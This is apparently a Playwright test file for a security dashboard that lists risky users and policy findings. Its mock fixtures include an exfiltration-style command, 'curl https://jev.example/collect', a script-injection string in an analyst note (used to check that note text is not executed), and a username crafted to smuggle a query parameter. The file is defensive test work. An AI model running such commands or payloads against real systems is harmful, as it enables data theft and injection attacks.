import { emptyRiskCases } from "./fixtures/risk-cases";
import { test, expect, type Page } from "@playwright/test";

// Keep scrollbars visible so layout tests exercise their effect on chart sizing.
test.use({ launchOptions: { ignoreDefaultArgs: ["--hide-scrollbars"] } });

const user = {
  id: "u",
  name: "Test operator",
  email: "test@example.invalid",
  roles: ["it_admin", "security_analyst", "security_leadership"],
  tenant: { id: "t", name: "Test tenant", slug: "test" },
};

const telemetry = {
  range: "24h",
  service: null,
  bucket_seconds: 3600,
  summary: {
    exports: 0,
    records: 0,
    log_records: 0,
    metric_points: 0,
    spans: 0,
    devices: 0,
    online_devices: 0,
    offline_devices: 0,
    disabled_devices: 0,
    last_export_at: null,
  },
  activity: [],
  available_services: ["claude-code"],
  services: [],
  devices: [],
  recent_exports: [],
};

const recent = new Date(Date.now() - 5 * 60 * 1000).toISOString();

const sensors = new Map<string, string>();
/** One stable sensor id per OS username, so a user's findings share a device unless overridden. */
function sensorFor(userName: string) {
  if (!sensors.has(userName)) sensors.set(userName, `30000000-0000-4000-8000-${String(sensors.size + 1).padStart(12, "0")}`);
  return sensors.get(userName)!;
}

function finding(
  id: string,
  severity: string,
  userName: string,
  status = "open",
  device: { hostname?: string; sensor_id?: string } = {},
) {
  return {
    id,
    title: `Finding ${id}`,
    severity,
    status,
    rule_name: "Destructive command",
    created_at: recent,
    sensor_id: device.sensor_id ?? sensorFor(userName),
    host: { hostname: device.hostname ?? (userName ? `${userName}-laptop` : ""), user: userName },
  };
}

const summary = {
  range: "30d",
  agents: { total: 4, active: 3 },
  sessions: 22,
  sensors: { total: 2, online: 1, disabled: 0, offline: 1 },
  findings_open: { critical: 3, high: 11, medium: 3, low: 0, info: 0 },
  by_category: [
    { category: "destructive_command", count: 14 },
    { category: "secret_exfiltration", count: 2 },
  ],
  recent_findings: [
    { ...finding("r1", "critical", "alice"), rule_name: "JEV egress", title: "JEV egress: upload to jev.example" },
    { ...finding("r2", "high", "bob"), rule_name: "JEV egress", title: "Secret access then egress to jev.example" },
  ],
  // 31 UTC day buckets, as the server returns for 30d: the oldest is partial,
  // starting before the rolling cutoff, and its 4 findings fall outside the
  // window. Then 3 new findings the week before last and 7 in the last week.
  timeline: Array.from({ length: 31 }, (_, i) => ({
    bucket: new Date(Date.UTC(2026, 7, 31 + i)).toISOString(),
    findings: i === 0 ? 4 : i === 21 ? 3 : i === 28 ? 5 : i === 30 ? 2 : 0,
  })),
};

// bob has eleven high findings, but alice has the only open critical one, so
// she ranks first. carol's critical finding is resolved and does not count.
const findings = {
  items: [
    finding("f1", "critical", "alice"),
    ...Array.from({ length: 11 }, (_, i) => finding(`h${i}`, "high", "bob")),
    finding("f4", "medium", "bob"),
    finding("f5", "critical", "carol", "resolved"),
  ],
  next_cursor: "",
};

// Aggregate API fixtures; database tests verify the production aggregation.
/** Mirrors `GET /user-risk`: group by reported account, else by OS username on one sensor. */
function userTotals(rows: (ReturnType<typeof finding> & { account?: string })[]) {
  type Row = { kind: "account" | "os_user"; user: string; sensor_id: string | null; users: string[]; hosts: string[]; accounts: string[]; open: Record<string, number>; openTotal: number; total: number };
  const groups = new Map<string, Row>();
  const severities = ["critical", "high", "medium", "low", "info"];
  for (const row of rows) {
    const account = row.account ?? "";
    const key = account ? `account:${account}` : `os_user:${row.sensor_id}:${row.host.user}`;
    const item = groups.get(key) ?? { kind: account ? "account" : "os_user", user: account || row.host.user, sensor_id: account ? null : row.sensor_id,
      users: [], hosts: [], accounts: [], open: Object.fromEntries(severities.map((s) => [s, 0])), openTotal: 0, total: 0 };
    item.total++;
    if (["open", "triaged"].includes(row.status)) { item.open[row.severity]++; item.openTotal++; }
    if (row.host.user && !item.users.includes(row.host.user)) item.users.push(row.host.user);
    if (account && !item.accounts.includes(account)) item.accounts.push(account);
    if (row.host.hostname && !item.hosts.includes(row.host.hostname)) item.hosts.push(row.host.hostname);
    groups.set(key, item);
  }
  const items = [...groups.values()].sort((a, b) => {
    for (const severity of severities) if (a.open[severity] !== b.open[severity]) return b.open[severity] - a.open[severity];
    return b.total - a.total || a.user.localeCompare(b.user) || (a.sensor_id ?? "").localeCompare(b.sensor_id ?? "");
  });
  for (const item of items) { item.users.sort(); item.hosts.sort(); }
  return { items, total_findings: rows.length };
}

async function mockApi(
  page: Page,
  overview: unknown | (() => unknown) = summary,
  telemetryStatus = 200,
) {
  await page.route("**/api/v1/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path.endsWith("auth/me")) return route.fulfill({ json: { user } });
    if (path.endsWith("/knowledge")) return route.fulfill({ json: { enabled: false, revision: 0, documents: [], updated_at: null } });
    if (path.endsWith("telemetry/overview"))
      return telemetryStatus === 200
        ? route.fulfill({ json: telemetry })
        : route.fulfill({
            status: telemetryStatus,
            json: { error: { code: "unavailable", message: "telemetry is down" } },
          });
    if (path.endsWith("/overview")) {
      const body = typeof overview === "function" ? overview() : overview;
      return body === null
        ? route.fulfill({
            status: 503,
            json: { error: { code: "unavailable", message: "summary is down" } },
          })
        : route.fulfill({ json: body });
    }
    if (path.endsWith("/risk-cases")) return route.fulfill({ json: emptyRiskCases() });
    if (path.endsWith("/findings")) return route.fulfill({ json: findings });
    if (path.endsWith("/user-risk")) return route.fulfill({ json: userTotals(findings.items) });
    if (path.endsWith("events/live"))
      return route.fulfill({ json: { items: [], cursor: "", more: false } });
    return route.fulfill({ json: { items: [], next_cursor: "" } });
  });
}

const widget = (page: Page, title: string) =>
  page.getByRole("region", { name: title, exact: true });

test("reported accounts group findings across devices while OS users stay per device", async ({ page }, testInfo) => {
  await mockApi(page);
  const desk = { hostname: "alex-desktop", sensor_id: "30000000-0000-4000-8000-00000000dead" };
  await page.route("**/api/v1/user-risk?group=identity", (route) => route.fulfill({ json: userTotals([
      { ...finding("work", "critical", "alice"), account: "alice@work.example" },
      { ...finding("personal", "high", "alice"), account: "alice@personal.example" },
      { ...finding("work-again", "medium", "alice"), account: "alice@work.example" },
      { ...finding("shared", "high", "bob"), account: "alice@work.example" },
      finding("laptop-alex", "low", "alex"),
      finding("desk-alex", "low", "alex", "open", desk),
      { ...finding("unknown", "info", ""), account: "unknown@example.com" },
  ]) }));
  // Registered last so it runs first: record the grouping the page asks for, then fall through.
  const groupings: (string | null)[] = [];
  await page.route("**/api/v1/user-risk*", (route) => { groupings.push(new URL(route.request().url()).searchParams.get("group")); return route.fallback(); });
  await page.goto("/user-risk?view=findings");
  const explanation = page.getByText(/^Findings are grouped by the account the agent reported/);
  await expect(explanation).toBeHidden();
  const help = page.locator("summary").filter({ hasText: "Findings grouped by reported identity" });
  await expect(help).toBeVisible();
  expect(groupings.length).toBeGreaterThan(0);
  expect(groupings.every((group) => group === "identity")).toBe(true);
  const table = page.getByRole("region", { name: "Findings by reported user", exact: true }).getByRole("region", { name: "Scrollable data table" });
  await expect(table.getByRole("columnheader", { name: "Reported identity" })).toBeVisible();
  await expect(table.getByRole("columnheader", { name: "Grouped by" })).toBeVisible();
  const rows = table.getByRole("row");
  await expect(rows).toHaveCount(6);
  // One account seen on two devices and under two OS users is one person.
  const work = rows.nth(1).getByRole("cell");
  await expect(work.nth(0)).toHaveText("alice@work.example");
  await expect(work.nth(1)).toHaveText("Agent accountOS users: alice, bob");
  await expect(work.nth(3)).toHaveText("3");
  await expect(work.nth(4)).toHaveText("3");
  await expect(work.nth(5)).toHaveText("alice-laptop, bob-laptop");
  await expect(page.getByRole("link", { name: "View 1 critical findings for alice@work.example", exact: true }))
    .toHaveAttribute("href", "/user-risk/findings?account=alice%40work.example&severity=critical&status=active");
  await expect(rows.nth(2).getByRole("cell").nth(0)).toHaveText("alice@personal.example");
  // The same OS username on two devices without an account stays two rows.
  const laptop = rows.nth(3).getByRole("cell");
  await expect(laptop.nth(0)).toHaveText("alex");
  await expect(laptop.nth(1)).toHaveText("OS user on one deviceNo account reported");
  await expect(laptop.nth(5)).toHaveText("alex-laptop");
  await expect(rows.nth(4).getByRole("cell").nth(0)).toHaveText("alex");
  await expect(rows.nth(4).getByRole("cell").nth(5)).toHaveText("alex-desktop");
  await expect(page.getByRole("link", { name: "View all open and triaged findings for alex on alex-desktop", exact: true }))
    .toHaveAttribute("href", `/user-risk/findings?account=&username=alex&sensor_id=${desk.sensor_id}&status=active`);
  await expect(page.getByRole("link", { name: "View all findings for alex on alex-laptop", exact: true }))
    .toHaveAttribute("href", `/user-risk/findings?account=&username=alex&sensor_id=${sensorFor("alex")}`);
  const unknown = rows.nth(5).getByRole("cell");
  await expect(unknown.nth(0)).toHaveText("unknown@example.com");
  await expect(unknown.nth(1)).toHaveText("Agent accountOS users: not reported");
  await page.screenshot({ path: testInfo.outputPath("identity-attribution.png"), fullPage: true, animations: "disabled" });
  await help.click();
  await expect(explanation).toBeVisible();
  await expect(explanation).toContainText("the same local name on different devices stays separate");
  await expect(explanation).toContainText("across all retained findings in this tenant");
  await expect(explanation).toContainText("not a verified identity or a risk score.");
  await page.screenshot({ path: testInfo.outputPath("user-risk-help-expanded.png"), fullPage: true, animations: "disabled" });
  await help.press("Enter");
  await expect(explanation).toBeHidden();
  await expect(help).toBeFocused();
  await help.press("Space");
  await expect(explanation).toBeVisible();
  await help.press("Space");
  await expect(explanation).toBeHidden();

  await page.setViewportSize({ width: 360, height: 800 });
  expect((await help.boundingBox())!.height).toBeGreaterThanOrEqual(40);
  await page.screenshot({ path: testInfo.outputPath("user-risk-mobile.png"), fullPage: true, animations: "disabled" });
  await help.click();
  await expect(explanation).toBeVisible();
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(360);
  await page.screenshot({ path: testInfo.outputPath("user-risk-help-mobile.png"), fullPage: true, animations: "disabled" });
  await help.click();
  await expect(explanation).toBeHidden();
  await page.setViewportSize({ width: 1440, height: 1080 });

});

test("Risky Sessions/Users keeps empty guidance brief and request errors visible", async ({ page }) => {
  await mockApi(page);
  let fail = false;
  await page.route("**/api/v1/user-risk?group=identity", (route) =>
    fail
      ? route.fulfill({ status: 503, json: { error: { message: "Findings unavailable" } } })
      : route.fulfill({ json: { items: [], total_findings: 0 } }),
  );
  await page.goto("/user-risk?view=findings");
  await expect(page.getByText("No user findings to summarize", { exact: true })).toBeVisible();
  await expect(page.getByText("Findings appear when collected activity matches a detection rule.", { exact: true })).toBeVisible();
  const explanation = page.getByText(/^Findings are grouped by the account the agent reported/);
  await expect(explanation).toBeHidden();
  await page.locator("summary").filter({ hasText: "Findings grouped by reported identity" }).click();
  await expect(explanation).toBeVisible();

  fail = true;
  await page.reload();
  await expect(page.locator("main").getByRole("alert")).toContainText("Findings unavailable");
  await expect(page.getByRole("button", { name: "Retry", exact: true })).toBeVisible();
  await expect(explanation).toBeHidden();
  await expect(page.getByText("No user findings to summarize", { exact: true })).toBeHidden();
  await expect(page.getByRole("region", { name: "Policy findings", exact: true }).getByRole("button", { name: "Finding f1", exact: true })).toBeVisible();
});

test("Risky Sessions/Users shows complete totals and distinguish stale or invalid responses", async ({ page }, info) => {
  await mockApi(page);
  // Per-username rows without `kind`, as an older backend returns them after a
  // backend rollback: they render and link by OS username alone.
  const totals = { total_findings: 520, items: [
    { user: "panhu", hosts: ["pan-m5.local"], accounts: ["personal@example.test", "work@example.test"], total: 515, openTotal: 513,
      open: { critical: 12, high: 501, medium: 0, low: 0, info: 0 } },
    { user: "closed-user", hosts: [], accounts: [], total: 5, openTotal: 0,
      open: { critical: 0, high: 0, medium: 0, low: 0, info: 0 } },
  ] };
  let mode = "success";
  let release!: () => void;
  const pending = new Promise<void>((resolve) => { release = resolve; });
  const findingRequests: URL[] = [];
  page.on("request", (request) => {
    const url = new URL(request.url());
    if (url.pathname === "/api/v1/findings") findingRequests.push(url);
  });
  await page.route("**/api/v1/user-risk?group=identity", async (route) => {
    await pending;
    if (mode === "error") return route.fulfill({ status: 503, json: { error: { message: "Totals unavailable" } } });
    if (mode === "invalid") return route.fulfill({ json: { ...totals, items: [{ ...totals.items[0], open: {} }] } });
    if (mode === "null") return route.fulfill({ contentType: "application/json", body: "null" });
    return route.fulfill({ json: totals });
  });
  await page.goto("/user-risk?view=findings");
  const aggregate = page.getByRole("region", { name: "Findings by reported user", exact: true });
  await expect(aggregate.getByRole("status").filter({ hasText: "Loading" })).toBeVisible();
  await expect(page.getByRole("region", { name: "Policy findings", exact: true }).getByRole("button", { name: "Finding f1", exact: true })).toBeVisible();
  await expect(page.getByText("0 retained findings", { exact: false })).toHaveCount(0);
  release();
  await expect(page.getByText("520 retained findings across 2 reported users.", { exact: true })).toBeVisible();
  const critical = page.getByRole("link", { name: "View 12 critical findings for panhu", exact: true });
  await expect(critical).toHaveAttribute("href", "/user-risk/findings?username=panhu&severity=critical&status=active");
  await expect(page.getByRole("link", { name: "View all findings for panhu", exact: true })).toHaveText("515");
  await expect(page.getByRole("link", { name: "View all open and triaged findings for panhu", exact: true })).toHaveText("513");
  await expect(aggregate.getByRole("button", { name: "Load more", exact: true })).toHaveCount(0);
  await page.screenshot({ path: info.outputPath("user-risk-complete-totals.png"), fullPage: true, animations: "disabled" });
  expect(findingRequests.length).toBeGreaterThan(0);
  expect(findingRequests.every((url) => url.searchParams.get("source") === "policy")).toBe(true);
  mode = "error";
  await aggregate.getByRole("button", { name: "Refresh", exact: true }).click();
  await expect(page.locator("main").getByRole("alert")).toContainText("Showing stale data");
  await expect(critical).toBeVisible();
  for (mode of ["invalid", "null"]) {
    const response = page.waitForResponse("**/api/v1/user-risk?group=identity");
    await page.getByRole("button", { name: "Retry", exact: true }).click();
    await response;
    await expect(page.locator("main").getByRole("alert")).toContainText("complete user totals");
    await expect(critical).toHaveCount(0);
    await expect(page.getByText("No user findings to summarize", { exact: true })).toHaveCount(0);
  }

});

const investigationId = (index: number) => `10000000-0000-4000-8000-${String(index).padStart(12, "0")}`;
const unusualUsername = "DOMAIN\\JEV + admin&scope=all";

async function mockUserInvestigation(page: Page) {
  await mockApi(page);
  const rows = [
    { ...finding(investigationId(1), "critical", "alice"), title: "Upload to jev.example", summary: "A retained upload request needs review.", product: "codex", session_id: investigationId(20) },
    { ...finding(investigationId(2), "critical", "alice", "triaged"), title: "Retained session incident", summary: "Review the retained report and cited evidence.", investigation_job_id: investigationId(21), investigation_attempt_id: investigationId(22), snapshot_id: investigationId(23), session_id: investigationId(20) },
    finding(investigationId(3), "critical", "bob"),
    finding(investigationId(4), "high", "alice"),
    finding(investigationId(5), "critical", "alice", "resolved"),
    finding(investigationId(6), "critical", ""),
    finding(investigationId(7), "high", unusualUsername),
    { ...finding(investigationId(8), "critical", "alice"), title: "Older matching finding" },
  ];
  await page.route("**/api/v1/user-risk?group=identity", (route) => route.fulfill({ json: userTotals(rows) }));
  const requests: URL[] = [];
  await page.route("**/api/v1/findings**", (route) => {
    const url = new URL(route.request().url());
    requests.push(url);
    if (url.pathname.endsWith("/findings")) {
      const q = url.searchParams;
      const matches = rows.filter((f) => (!q.has("username") || f.host.user === q.get("username"))
        && (!q.has("account") || ("account" in f ? f.account : "") === q.get("account"))
        && (!q.has("sensor_id") || f.sensor_id === q.get("sensor_id"))
        && (!q.has("severity") || f.severity === q.get("severity"))
        && (!q.has("status") || (q.get("status") === "active" ? ["open", "triaged"].includes(f.status) : f.status === q.get("status")))
        && (!q.has("source") || (q.get("source") === "incident" ? "investigation_job_id" in f : !("investigation_job_id" in f))));
      const start = q.has("cursor") ? 2 : 0;
      return route.fulfill({ json: { items: matches.slice(start, start + 2), next_cursor: start + 2 < matches.length ? "next" : "" } });
    }
    const selected = rows.find((f) => url.pathname.endsWith(`/${f.id}`));
    if (!selected) return route.fulfill({ status: 404, json: { error: { message: "Finding not found" } } });
    return route.fulfill({ json: { finding: { ...selected, account: "alice@example.test", resolution: "", assignee: null },
      events: [{ id: investigationId(30), kind: "command", time: recent, command: { text: "curl https://jev.example/collect", cwd: "/project" }, host: selected.host }],
      notes: [{ id: investigationId(31), author: { name: "Analyst" }, created_at: recent, body: "<script>window.badEvidence=true</script>\n" + "Review retained evidence. ".repeat(80) }], actions: [] } });
  });
  return requests;
}

test("Risky Sessions/Users policy findings load independently and retain filters, pagination, and evidence", async ({ page }, info) => {
  const requests = await mockUserInvestigation(page);
  let release!: () => void;
  const pending = new Promise<void>((resolve) => { release = resolve; });
  let fail = false;
  await page.route("**/api/v1/findings?**", async (route) => {
    await pending;
    if (fail) return route.fulfill({ status: 503, json: { error: { message: "Policy findings unavailable" } } });
    return route.fallback();
  });
  await page.goto("/user-risk?view=findings");
  const aggregate = page.getByRole("region", { name: "Findings by reported user", exact: true });
  const policy = page.getByRole("region", { name: "Policy findings", exact: true });
  await expect(aggregate).toContainText("8 retained findings across 4 reported users.");
  await expect(policy.getByText("Loading policy findings…", { exact: true })).toBeVisible();
  release();
  const upload = policy.getByRole("button", { name: "Upload to jev.example", exact: true });
  await expect(upload).toBeVisible();
  await expect(policy).not.toContainText("Retained session incident");
  await policy.getByRole("button", { name: "Load more", exact: true }).click();
  await expect(policy.getByRole("button", { name: `Finding ${investigationId(5)}`, exact: true })).toBeVisible();
  expect(requests.at(-1)?.searchParams.get("cursor")).toBe("next");
  for (const viewport of [{ width: 1440, height: 1080 }, { width: 390, height: 844 }]) {
    await page.setViewportSize(viewport);
    await policy.getByRole("button", { name: "Refresh", exact: true }).scrollIntoViewIfNeeded();
    await expect(policy.getByRole("button", { name: "Refresh", exact: true })).toBeInViewport();
    expect((await aggregate.boundingBox())!.y).toBeLessThan((await policy.boundingBox())!.y);
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
    await page.screenshot({ path: info.outputPath(`user-risk-policy-findings-${viewport.width}.png`), fullPage: true, animations: "disabled" });
    await upload.click();
    const detail = page.getByRole("dialog", { name: "Finding details" });
    await expect(detail).toContainText("curl https://jev.example/collect");
    await expect(detail.getByRole("link", { name: "View session details" })).toHaveAttribute("href", `/sessions/${investigationId(20)}`);
    await detail.getByRole("button", { name: "Close", exact: true }).click();
  }
  await policy.getByRole("combobox", { name: "Statuses" }).click();
  await page.getByRole("option", { name: "resolved", exact: true }).click();
  await expect(policy.getByRole("button", { name: `Finding ${investigationId(5)}`, exact: true })).toBeVisible();
  await expect(upload).toHaveCount(0);
  await policy.getByRole("combobox", { name: "Severities" }).click();
  await page.getByRole("option", { name: "high", exact: true }).click();
  await expect(policy.getByText("No policy findings match", { exact: true })).toBeVisible();
  await expect(aggregate).toContainText("8 retained findings across 4 reported users.");
  await policy.getByRole("combobox", { name: "Severities" }).click();
  await page.getByRole("option", { name: "critical", exact: true }).click();
  const resolved = policy.getByRole("button", { name: `Finding ${investigationId(5)}`, exact: true });
  await expect(resolved).toBeVisible();
  expect(requests.at(-1)?.searchParams.get("status")).toBe("resolved");
  expect(requests.at(-1)?.searchParams.get("severity")).toBe("critical");
  expect(requests.at(-1)?.searchParams.has("cursor")).toBe(false);
  expect(requests.filter((url) => url.pathname.endsWith("/findings")).every((url) => url.searchParams.get("source") === "policy")).toBe(true);
  fail = true;
  await policy.getByRole("button", { name: "Refresh", exact: true }).click();
  await expect(policy.getByRole("alert")).toContainText("Showing stale data");
  await expect(resolved).toBeVisible();
  await expect(aggregate).toContainText("8 retained findings across 4 reported users.");
  fail = false;
  await policy.getByRole("button", { name: "Retry", exact: true }).click();
  await expect(policy.getByRole("alert")).toHaveCount(0);
  await expect(resolved).toBeVisible();
});

test("Risky Sessions/Users counts open URL-filtered findings and retain evidence context", async ({ page }, info) => {
  const requests = await mockUserInvestigation(page);
  await page.goto("/user-risk?view=findings");
  const device = `account=&username=alice&sensor_id=${sensorFor("alice")}`;
  const critical = page.getByRole("link", { name: "View 3 critical findings for alice on alice-laptop", exact: true });
  await expect(critical).toBeVisible();
  await expect(page.getByRole("link", { name: "alice", exact: true })).toHaveAttribute("href", `/user-risk/findings?${device}&status=active`);
  await expect(page.getByRole("link", { name: "View all findings for alice on alice-laptop", exact: true })).toHaveAttribute("href", `/user-risk/findings?${device}`);
  await expect(page.getByRole("link", { name: "View all open and triaged findings for alice on alice-laptop", exact: true })).toHaveAttribute("href", `/user-risk/findings?${device}&status=active`);
  await page.screenshot({ path: info.outputPath("user-risk-investigation-links.png"), fullPage: true, animations: "disabled" });
  await critical.focus();
  await page.keyboard.press("Enter");
  await expect(page).toHaveURL(new RegExp(`/user-risk/findings\\?${device}&severity=critical&status=active$`));
  const results = page.getByRole("region", { name: "Critical findings for alice on alice-laptop", exact: true });
  await expect(page.getByRole("button", { name: "Remove device filter", exact: true })).toHaveText("Device: alice-laptop");
  await expect(page.getByRole("button", { name: "Remove account filter", exact: true })).toHaveText("Account: Not reported");
  await expect(results.getByRole("button", { name: "Upload to jev.example", exact: true })).toBeVisible();
  await expect(results.getByRole("button", { name: "Retained session incident", exact: true })).toBeVisible();
  await expect(results).toContainText("Policy finding");
  await expect(results).toContainText("Incident report");
  expect(requests.some((url) => url.searchParams.get("username") === "alice" && url.searchParams.get("account") === "" && url.searchParams.get("sensor_id") === sensorFor("alice")
    && url.searchParams.get("status") === "active" && url.searchParams.get("severity") === "critical" && !url.searchParams.has("source"))).toBe(true);
  await results.getByRole("button", { name: "Load more", exact: true }).click();
  await expect(results.getByRole("button", { name: "Older matching finding", exact: true })).toBeVisible();
  expect(requests.at(-1)?.searchParams.get("cursor")).toBe("next");
  const findingButton = results.getByRole("button", { name: "Upload to jev.example", exact: true });
  await findingButton.click();
  const detail = page.getByRole("dialog", { name: "Finding details" });
  await expect(detail).toContainText("curl https://jev.example/collect");
  await expect(detail.getByRole("link", { name: "View session details" })).toHaveAttribute("href", `/sessions/${investigationId(20)}`);
  await expect(page).toHaveURL(new RegExp(`finding=${investigationId(1)}`));
  expect(await page.evaluate(() => (window as unknown as { badEvidence?: boolean }).badEvidence)).toBeUndefined();
  await page.screenshot({ path: info.outputPath("user-finding-details.png"), animations: "disabled" });
  await page.keyboard.press("Escape");
  await expect(detail).toBeHidden();
  await expect(findingButton).toBeFocused();
  await expect(results.getByRole("button", { name: "Older matching finding", exact: true })).toBeVisible();
  await results.getByRole("button", { name: "Retained session incident", exact: true }).click();
  await expect(detail.getByRole("link", { name: "View retained session investigation" })).toHaveAttribute("href", new RegExp(`investigation=${investigationId(21)}.*attempt=${investigationId(22)}.*snapshot=${investigationId(23)}`));
  await page.reload();
  await expect(detail).toContainText("Retained session incident");
  await page.keyboard.press("Escape");
  await expect(detail).toBeHidden();
  await expect(page).not.toHaveURL(/finding=/);
  await results.getByRole("combobox", { name: "Sources" }).click();
  await page.getByRole("option", { name: "Policy findings", exact: true }).click();
  await expect(page).toHaveURL(/source=policy/);
  await expect(results.getByRole("button", { name: "Upload to jev.example", exact: true })).toBeVisible();
  await expect(results.getByRole("button", { name: "Retained session incident", exact: true })).toHaveCount(0);
  await page.goBack();
  await expect(results.getByRole("button", { name: "Retained session incident", exact: true })).toBeVisible();
  await results.getByRole("combobox", { name: "Statuses" }).click();
  await page.getByRole("option", { name: "false positive", exact: true }).click();
  await expect(results).toContainText("No findings match these filters");
  await page.getByRole("button", { name: "Remove status filter", exact: true }).click();
  await expect(results.getByRole("button", { name: "Upload to jev.example", exact: true })).toBeVisible();
  await page.getByRole("button", { name: "Clear all filters", exact: true }).click();
  await expect(page).toHaveURL(/\/user-risk\/findings$/);
  await expect(page.getByRole("region", { name: "Findings", exact: true })).toContainText("All users, severities, statuses, and sources.");
});

test("User findings preserve exact and missing usernames on mobile and reject invalid links", async ({ page }, info) => {
  await page.setViewportSize({ width: 390, height: 720 });
  const requests = await mockUserInvestigation(page);
  await page.goto("/user-risk?view=findings");
  await page.getByRole("link", { name: "View 1 critical findings for unattributed users on unnamed device", exact: true }).click();
  await expect(page.getByRole("region", { name: "Critical findings for unattributed users on unnamed device", exact: true })).toContainText("User not reported");
  expect(requests.at(-1)?.searchParams.get("username")).toBe("");
  await page.getByRole("link", { name: "Back to Risky Sessions/Users" }).click();
  await page.getByRole("link", { name: `View 1 high findings for ${unusualUsername} on ${unusualUsername}-laptop`, exact: true }).click();
  await expect(page.getByRole("heading", { name: `High findings for ${unusualUsername} on ${unusualUsername}-laptop`, exact: true })).toBeVisible();
  expect(new URL(page.url()).searchParams.get("username")).toBe(unusualUsername);
  await expect(page.getByRole("combobox", { name: "Statuses" })).toBeHidden();
  await page.locator("summary").filter({ hasText: "Edit filters" }).click();
  await page.getByRole("combobox", { name: "Severities" }).click();
  await page.getByRole("option", { name: "All severities", exact: true }).click();
  await expect(page.getByRole("combobox", { name: "Severities" })).toBeVisible();
  await page.getByRole("textbox", { name: "OS username", exact: true }).fill("alice");
  await page.getByRole("button", { name: "Apply user", exact: true }).click();
  // Applying a typed OS username drops the row's device and account scope.
  await expect(page.getByRole("heading", { name: "Findings for alice", exact: true })).toBeVisible();
  expect(new URL(page.url()).searchParams.has("sensor_id")).toBe(false);
  await page.locator("summary").filter({ hasText: "Edit filters" }).click();
  await expect(page.getByRole("combobox", { name: "Statuses" })).toBeHidden();
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
  await page.screenshot({ path: info.outputPath("user-findings-mobile.png"), fullPage: true, animations: "disabled" });
  await page.getByRole("button", { name: "Upload to jev.example", exact: true }).click();
  const detail = page.getByRole("dialog", { name: "Finding details" });
  await expect(detail).toContainText("No response actions recorded.");
  const scroller = detail.locator(".overflow-y-auto");
  await scroller.evaluate((element) => { element.scrollTop = element.scrollHeight; });
  await expect(detail.getByText("No response actions recorded.", { exact: true })).toBeInViewport();
  await expect(detail.getByRole("button", { name: "Close", exact: true })).toBeInViewport();
  expect(await scroller.evaluate((element) => element.scrollWidth <= element.clientWidth)).toBe(true);
  await page.setViewportSize({ width: 320, height: 480 });
  await expect(detail.getByRole("button", { name: "Close", exact: true })).toBeInViewport();
  expect(await scroller.evaluate((element) => element.scrollWidth <= element.clientWidth)).toBe(true);
  await detail.getByRole("button", { name: "Close", exact: true }).click();
  await expect(detail).toBeHidden();
  await expect(page).not.toHaveURL(/finding=/);
  const before = requests.length;
  await page.goto("/user-risk/findings?username=alice&severity=unsupported");
  await expect(page.locator("main").getByRole("alert")).toContainText("invalid finding filter");
  expect(requests.length).toBe(before);
  await page.goto(`/user-risk/findings?finding=${investigationId(999)}`);
  await expect(detail.getByRole("alert")).toContainText("Finding not found");
});
